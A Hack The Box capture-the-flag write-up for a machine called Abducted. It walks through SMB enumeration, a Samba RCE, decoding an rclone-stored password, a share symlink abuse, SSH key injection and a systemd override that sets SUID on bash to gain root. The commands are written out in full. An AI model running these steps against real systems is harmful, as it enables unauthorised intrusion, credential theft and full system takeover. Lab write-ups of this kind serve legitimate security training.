# HTB Machine: Abducted Write-Up

**By:** austinjump-sec

> *Note: Screenshots unavailable due to Ventoy USB storage constraints. Full command output and methodology documented below.*

---

## 1. Recon & Enumeration

### Initial Port Scan
I began the assessment with a service version scan to identify open ports and services:

```bash
nmap -sV -Pn <target-ip>
```

**Results:**
- Port 22: SSH
- Port 139: NetBIOS (SMB)
- Port 445: SMB

### SMB Enumeration
With SMB services exposed, I proceeded to enumerate available shares and permissions:

```bash
smbclient -L //<target-ip>/ -N
```

I identified the `HB-Reception` share and successfully connected with null credentials. Upon exploring the share, I discovered **write permissions**, which immediately suggested a remote code execution vulnerability.

### Vulnerability Analysis
Write access to SMB shares with execution privileges aligns with **CVE-2017-7494** (Samba RCE via shared library injection). This vulnerability allows an attacker to upload a malicious `.so` file that gets executed by the SMB daemon.

I leveraged this vulnerability to upload and execute a reverse shell payload, resulting in initial access as the `nobody` user.

---

## 2. First Lateral Movement: nobody → scott

### Post-Exploitation Enumeration
With shell access, I began searching for credentials and configuration files outside standard system paths:

```bash
find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
```

This search revealed configuration files in `/opt/offsite-backup/`, including `rclone.conf`.

### Credential Discovery & Decoding
I found the rclone configuration file containing an obfuscated password:

```bash
cat /opt/offsite-backup/rclone.conf
```

The output contained an obfuscated credential: `HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw`

Using rclone's built-in reveal function, I decoded the password:

```bash
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

**Decoded Password:** `iXzvcib3SrpZ`

### SSH Access as scott
I tested the decoded password with the `scott` user via SSH:

```bash
ssh scott@<target-ip>
```

Successfully authenticated. I captured the user flag:

```bash
cat /home/scott/user.txt
```

---

## 3. Second Lateral Movement: scott → marcus

### SMB Share Analysis
While exploring the system as scott, I reviewed the Samba configuration to identify additional attack vectors:

```bash
cat /etc/samba/smb.conf
cat /etc/samba/shares.conf
```

The configuration revealed a critical misconfiguration in the `transfer` share:

```
[transfer]
path = /srv/transfer
valid users = scott
force user = marcus
read only = no
follow symlinks = yes
wide links = yes
```

**Key Finding:** The `force user = marcus` directive means any file created by scott in this share becomes owned by marcus. Combined with `wide links = yes`, this allows symlink traversal.

### Symlink Attack
I created a symlink within the transfer share pointing to marcus's home directory:

```bash
smbclient //<target-ip>/transfer -U 'scott%iXzvcib3SrpZ'
# Inside smbclient session:
symlink /home/marcus marcus
```

This allowed me to write files as scott that would be owned/executable by marcus.

### SSH Key Injection
I generated an SSH key pair on my attack machine and injected the public key into marcus's authorized_keys:

```bash
ssh-keygen -t rsa -b 4096
# Transfer public key to target via SMB
put /root/.ssh/id_rsa.pub authorized_keys
```

I then authenticated as marcus using the private key:

```bash
ssh -i /root/.ssh/id_rsa marcus@<target-ip>
```

---

## 4. Privilege Escalation: marcus → root

### Privilege Enumeration
Once logged in as marcus, I searched for files or directories where marcus held write permissions:

```bash
find / -group operators 2>/dev/null
```

**Critical Finding:** Marcus has write access to `/etc/systemd/system/smbd.service.d/` — a systemd service override directory. Any `.conf` file placed here is automatically loaded when the SMB daemon restarts.

### systemd Service Exploitation
Systemd allows service overrides via `ExecStartPre` directives, which execute with the privileges of the service (root). I created a malicious override file:

```bash
cat > /etc/systemd/system/smbd.service.d/rootbash.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF
```

This sets the SUID bit on `/bin/bash`, allowing any user to execute bash with root privileges.

### Service Restart & Privilege Gain
I reloaded the systemd daemon and restarted the SMB service:

```bash
systemctl daemon-reload
systemctl restart smbd
```

With the SUID bit set on bash, I invoked a privileged bash shell:

```bash
bash -p
```

The `-p` flag preserves the effective user ID (root from SUID). Root flag acquired:

```bash
cat /root/root.txt
```

---

## Summary

| Stage | User | Method |
|-------|------|--------|
| Initial Access | nobody | CVE-2017-7494 (Samba RCE) |
| Lateral Move #1 | scott | Credential extraction from rclone.conf |
| Lateral Move #2 | marcus | SMB symlink + SSH key injection |
| Privilege Escalation | root | systemd service override + SUID bash |

**Key Vulnerabilities Exploited:**
- Samba library injection (CVE-2017-7494)
- Weak credential storage (rclone obfuscation)
- Overpermissive SMB share configuration
- Writable systemd service override directory
